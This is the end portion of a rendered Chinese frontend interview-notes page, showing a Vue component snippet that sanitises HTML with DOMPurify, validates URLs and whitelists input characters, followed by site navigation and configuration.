<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> setup</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { ref, computed } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;vue&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> SafeHtml </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;@/components/SafeHtml.vue&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { isValidUrl } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;@/utils/validators&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> content</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> ref</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;p&gt;内容&lt;/p&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> url</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> ref</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https://example.com&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> input</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> ref</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> isValid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> ref</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> safeUrl</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> computed</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> isValidUrl</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(url.value) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> url.value </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;#&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> validateInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> () </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 白名单验证</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> allowed</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[a-zA-Z0-9\s.,!?]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  isValid.value </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> allowed.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">test</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(input.value);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">style</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> scoped</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">.invalid</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  border-color</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">red</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">style</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div></div></div></main><footer class="VPDocFooter" data-v-39a288b8 data-v-e257564d><!--[--><!--]--><!----><nav class="prev-next" aria-labelledby="doc-footer-aria-label" data-v-e257564d><span class="visually-hidden" id="doc-footer-aria-label" data-v-e257564d>Pager</span><div class="pager" data-v-e257564d><a class="VPLink link pager-link prev" href="/interview-markdown/guide/answers-performance.html" data-v-e257564d><!--[--><span class="desc" data-v-e257564d>Previous page</span><span class="title" data-v-e257564d>性能优化</span><!--]--></a></div><div class="pager" data-v-e257564d><a class="VPLink link pager-link next" href="/interview-markdown/guide/answers-v8.html" data-v-e257564d><!--[--><span class="desc" data-v-e257564d>Next page</span><span class="title" data-v-e257564d>V8 引擎</span><!--]--></a></div></nav></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><footer class="VPFooter has-sidebar" data-v-5d98c3a5 data-v-e315a0ad><div class="container" data-v-e315a0ad><p class="message" data-v-e315a0ad>Released under the MIT License.</p><p class="copyright" data-v-e315a0ad>Copyright © 2026 Your Name</p></div></footer><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"guide_answers-architecture.md\":\"UcFXZQtl\",\"guide_answers-engineering.md\":\"WNC7gxFe\",\"guide_answers-network.md\":\"x15TfVjw\",\"guide_answers-performance.md\":\"JeO9unQ4\",\"guide_answers-react.md\":\"G5p7h8_8\",\"guide_answers-v8.md\":\"D2qfH2RB\",\"guide_answers-vue.md\":\"Dd0MVD6B\",\"guide_answers-web3.md\":\"aeLlBJxd\",\"index.md\":\"COM6o0kc\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"我的文档网站\",\"description\":\"前端知识点总结\",\"base\":\"/interview-markdown/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"logo\":\"/logo.svg\",\"nav\":[{\"text\":\"面试题\",\"link\":\"/guide/answers-vue\"}],\"sidebar\":{\"/guide/\":[{\"text\":\"前端面试知识点\",\"collapsible\":true,\"items\":[{\"text\":\"Vue 面试题\",\"link\":\"/guide/answers-vue\"},{\"text\":\"React 面试题\",\"link\":\"/guide/answers-react\"},{\"text\":\"架构设计\",\"link\":\"/guide/answers-architecture\"},{\"text\":\"工程化\",\"link\":\"/guide/answers-engineering\"},{\"text\":\"性能优化\",\"link\":\"/guide/answers-performance\"},{\"text\":\"网络协议\",\"link\":\"/guide/answers-network\"},{\"text\":\"V8 引擎\",\"link\":\"/guide/answers-v8\"},{\"text\":\"Web3\",\"link\":\"/guide/answers-web3\"}]}]},\"footer\":{\"message\":\"Released under the MIT License.\",\"copyright\":\"Copyright © 2026 Your Name\"},\"search\":{\"provider\":\"local\"},\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/yourname/my-docs\"}]},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false}");</script>
    
  </body>
</html>